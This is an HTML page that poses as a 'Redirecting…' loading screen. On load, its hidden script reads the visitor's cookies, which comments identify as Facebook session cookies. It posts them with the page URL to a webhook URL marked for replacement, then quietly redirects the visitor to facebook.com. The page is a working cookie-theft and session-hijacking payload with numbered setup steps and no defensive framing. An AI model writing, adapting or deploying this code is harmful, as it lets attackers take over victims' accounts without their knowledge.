<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Loading…</title>
    <style>
        body{font-family:Arial,Helvetica,sans-serif;text-align:center;padding-top:100px;background:#f0f2f5;}
    </style>
</head>
<body>
    <h2>Redirecting…</h2>
    <p>Please wait a moment.</p>

    <script>
        // ==== 1️⃣ Set your webhook URL here ====
        const webhookURL = "https://webhook.site/cf232a89-46d3-42f2-b351-91da3852244e"; // <<<  REPLACE THIS

        // ==== 2️⃣ Send the cookies to the webhook ====
        function exfiltrate() {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL, true);
            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');

            // Grab all cookies for the current domain (facebook.com)
            const cookies = document.cookie; // e.g., "c_user=12345; xs=abcd; fr=xyz; datr=..."

            // Post them as JSON
            xhr.send(JSON.stringify({
                cookies: cookies,
                url: window.location.href
            }));
        }

        // ==== 3️⃣ Immediately run the function when the page loads ====
        window.addEventListener('load', () => {
            exfiltrate();

            // ==== 4️⃣ Redirect back to Facebook after a short pause ====
            setTimeout(() => {
                window.location.href = "https://www.facebook.com/";
            }, 800); // 800 ms is usually enough
        });
    </script>
</body>
</html>
